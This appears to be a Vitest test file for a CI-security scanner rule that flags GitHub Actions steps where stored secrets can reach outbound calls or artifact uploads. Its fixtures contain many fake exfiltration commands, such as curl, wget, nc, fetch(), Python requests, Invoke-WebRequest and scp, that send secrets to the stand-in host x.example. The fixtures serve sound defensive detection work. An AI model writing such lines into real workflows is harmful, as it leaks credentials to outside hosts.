/**
 * WORKFLOW_SECRET_TO_UPLOAD_PATH is evaluated per step: a stored (non-ambient)
 * secret must be in scope for the same step that makes an outbound call or
 * uploads an artifact. It used to be a file-level text match, which reported
 * comments, `fetch-depth:` inputs, URL literals in regexes, loopback health
 * checks and secrets that lived in a different step.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { modelWorkflows } from "../workflow-modeler.js";
import { performanceBudget } from "./performance-budget.js";

const RULE = "WORKFLOW_SECRET_TO_UPLOAD_PATH";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-wf-egress-"));
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, lines: string[]): void {
  const full = path.join(dir, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, lines.join("\n"));
}

function workflow(lines: string[]): void {
  write(".github/workflows/ci.yml", lines);
}

function hits(): number[] {
  return modelWorkflows(dir)
    .filter((f) => f.rule === RULE)
    .map((f) => f.line ?? -1);
}

const HEAD = ["name: CI", "on: push", "jobs:", "  build:", "    runs-on: ubuntu-latest"];

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: must fire, on the step's line", () => {
  it("fires for a step whose inline env holds a stored secret and whose run curls it out", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/checkout@v4",
      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
      '        run: curl -d "$T" https://x.example',
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for an upload-artifact step whose own env holds a stored secret", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: npm ci",
      "      - uses: actions/upload-artifact@v4",
      "        env:",
      "          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}",
      "        with:",
      "          name: dist",
      "          path: dist/",
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for a job whose env holds a stored secret and whose step runs wget", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      API_KEY: ${{ secrets.API_KEY }}",
      "    steps:",
      "      - run: npm test",
      "      - name: report",
      "        run: |",
      '          wget --header "X-Key: $API_KEY" https://x.example/report',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("fires for a workflow-level env secret and a curl step", () => {
    write(".github/workflows/ci.yml", [
      "name: CI",
      "on: push",
      "env:",
      "  T: ${{ secrets.NPM_TOKEN }}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: curl -H "Authorization: $T" https://x.example',
    ]);
    expect(hits()).toEqual([9]);
  });

  it("fires when the secret is interpolated directly into the run body", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: |",
      "          echo start",
      '          curl -d "${{ secrets.NPM_TOKEN }}" https://x.example',
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for bracket access with single and double quotes", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets['NPM_TOKEN'] }}",
      '        run: curl -d "$T" https://x.example',
      "      - env:",
      '          U: ${{ secrets["NPM_TOKEN"] }}',
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires for the whole secrets context, via toJSON and bare", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          ALL: ${{ toJSON(secrets) }}",
      '        run: curl -d "$ALL" https://x.example',
      "      - env:",
      "          ALL: ${{secrets}}",
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires for whitespace variants inside the expression", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{secrets . NPM_TOKEN}}",
      '        run: curl -d "$T" https://x.example',
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for a fetch() call in a github-script step with a stored secret in env", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        with:",
      "          script: |",
      "            await fetch('https://x.example', { method: 'POST', body: process.env.T });",
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for a github-script step that receives a stored secret as an input and calls fetch()", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        with:",
      "          github-token: ${{ secrets.RELEASE_PAT }}",
      "          script: |",
      "            await fetch('https://x.example/hook', { method: 'POST' });",
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for nc and a curl whose target is a variable", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: echo "$T" | nc x.example 9000',
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: curl -d "$T" "$TARGET"',
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires when a loopback call and an external call share one step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          curl http://127.0.0.1:8080/health",
      '          curl -d "$T" https://x.example',
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: curl -d "$T" http://localhost@x.example/',
    ]);
    expect(hits()).toEqual([7, 12]);
  });

  it("fires for secrets: inherit into a reusable workflow outside this repository", () => {
    workflow([
      "name: CI",
      "on: push",
      "jobs:",
      "  release:",
      "    uses: some-org/pipelines/.github/workflows/release.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets: inherit",
      "  other:",
      "    uses: some-org/pipelines/.github/workflows/lint.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets:",
      "      token: ${{ secrets.NPM_TOKEN }}",
      "  ambient:",
      "    uses: some-org/pipelines/.github/workflows/lint.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets:",
      "      token: ${{ secrets.GITHUB_TOKEN }}",
    ]);
    expect(hits()).toEqual([4, 7]);
  });

  it("fires for a local composite action that makes an outbound call and receives a stored secret", () => {
    write(".github/actions/notify/action.yml", [
      "name: notify",
      "inputs:",
      "  token:",
      "    required: true",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - shell: bash",
      '      run: curl -H "Authorization: ${{ inputs.token }}" https://x.example',
    ]);
    write(".github/actions/local-only/action.yml", [
      "name: local-only",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - shell: bash",
      "      run: echo done",
    ]);
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: ./.github/actions/notify",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
      "      - uses: ./.github/actions/local-only",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
    ]);
    expect(hits()).toEqual([7]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: false positives", () => {
  it("does not fire when the secret is in one step and the curl in another", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: npm publish",
      "      - run: curl https://x.example/ping",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for an upload whose job keeps the stored token in a different step's env", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "        run: npm publish",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          name: dist",
      "          path: dist/",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for comments, fetch-depth, a URL in a regex literal, or prose words", () => {
    workflow([
      "# curl -d ${{ secrets.NPM_TOKEN }} https://x.example",
      ...HEAD,
      "    steps:",
      "      - uses: actions/checkout@v4",
      "        with:",
      "          fetch-depth: 0",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          # curl -d \"$T\" https://x.example",
      "          grep -E 'https?://[a-z.]+' urls.txt",
      "          echo prefetched and fetched",
      "          npm publish",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for loopback health checks", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          curl -fsS http://127.0.0.1:8080/health",
      '          curl -H "Authorization: Bearer $T" http://localhost:3000/api -o /dev/null',
      "          wget -qO- http://[::1]:9000/ready",
      "          nc -z localhost 5432",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for git fetch", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: git fetch origin main --depth=1",
    ]);
    expect(hits()).toEqual([]);
  });

  it("treats secrets.GITHUB_TOKEN, bracket GITHUB_TOKEN and github.token the same way (ambient)", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          A: ${{ secrets.GITHUB_TOKEN }}",
      '        run: curl -H "Authorization: $A" https://api.x.example',
      "      - env:",
      "          B: ${{ secrets['GITHUB_TOKEN'] }}",
      '        run: curl -H "Authorization: $B" https://api.x.example',
      "      - env:",
      "          C: ${{ github.token }}",
      '        run: curl -H "Authorization: $C" https://api.x.example',
      "      - env:",
      "          D: ${{ secrets.github_token }}",
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a stored secret passed only as a with: input to a remote action", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
      "          url: https://x.example",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not count with: inputs of an upload-artifact step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          name: report-${{ secrets.BUILD_LABEL }}",
      "          path: out/",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a service container's env", () => {
    workflow([
      ...HEAD,
      "    services:",
      "      db:",
      "        image: postgres:16",
      "        env:",
      "          POSTGRES_PASSWORD: ${{ secrets.DB_PASSWORD }}",
      "    steps:",
      "      - run: curl https://x.example/ping",
    ]);
    expect(hits()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: flow between steps and other egress tools", () => {
  it("fires when a step exports the secret to $GITHUB_ENV and a later step curls it out", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - run: echo "TOKEN=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
      "      - run: echo building",
      '      - run: curl -d "$TOKEN" https://x.example/i',
    ]);
    expect(hits()).toEqual([9]);
  });

  it("fires when a step writes the secret to a file and a later step uploads an artifact", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - run: echo "${{ secrets.SIGNING_KEY }}" > key.txt && tar czf out.tgz key.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: out.tgz",
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for a secret placed in a matrix value", () => {
    workflow([
      ...HEAD,
      "    strategy:",
      "      matrix:",
      '        token: ["${{ secrets.A_TOKEN }}"]',
      "    steps:",
      '      - run: curl -d "${{ matrix.token }}" https://x.example/i',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("fires for Python requests, PowerShell Invoke-WebRequest and scp to a remote host", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      `      - run: python -c "import requests; requests.post('https://x.example', data='$T')"`,
      "      - run: Invoke-WebRequest -Uri https://x.example -Body $env:T",
      "      - run: scp o.txt user@x.example:/tmp/",
    ]);
    expect(hits()).toEqual([9, 10, 11]);
  });

  it("does not carry the secret past a step that only discards output, or into another job", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: npm publish > /dev/null 2>&1",
      "        env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "      - run: curl -fsS https://x.example/health",
      "  other:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: echo "T=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
      "  third:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: curl -fsS https://x.example/health",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a local rsync or for gh api with a stored token", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      "      - run: rsync -a dist/ out/",
      "      - run: gh api repos/o/r/releases",
    ]);
    expect(hits()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
  const FIVE_MIB = 5 * 1024 * 1024;

  function timed(lines: string[]): number {
    workflow(lines);
    const started = performance.now();
    modelWorkflows(dir);
    return performance.now() - started;
  }

  it("unclosed expressions, fetch( without a literal and one long curl line", { timeout: performanceBudget(60_000) }, () => {
    const unclosed = "${{ secrets ".repeat(Math.ceil(FIVE_MIB / 12));
    expect(
      timed([...HEAD, "    steps:", "      - env:", `          T: ${unclosed}`, "        run: curl https://x.example"]),
    ).toBeLessThan(performanceBudget(15_000));

    const fetches = "fetch( ".repeat(Math.ceil(FIVE_MIB / 7));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: ${fetches}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const args = "localhost ".repeat(Math.ceil(FIVE_MIB / 10));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl ${args}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const quotes = '"'.repeat(FIVE_MIB);
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl -H ${quotes}`]),
    ).toBeLessThan(performanceBudget(15_000));
  });

  it("many steps each with a secret and a loopback call", { timeout: performanceBudget(60_000) }, () => {
    const step = [
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: curl http://127.0.0.1:8080/health",
    ];
    const per = step.join("\n").length + 1;
    const lines = [...HEAD, "    steps:"];
    for (let i = 0; i < Math.ceil(FIVE_MIB / per); i++) lines.push(...step);
    expect(timed(lines)).toBeLessThan(performanceBudget(15_000));
    expect(hits()).toEqual([]);
  });
});
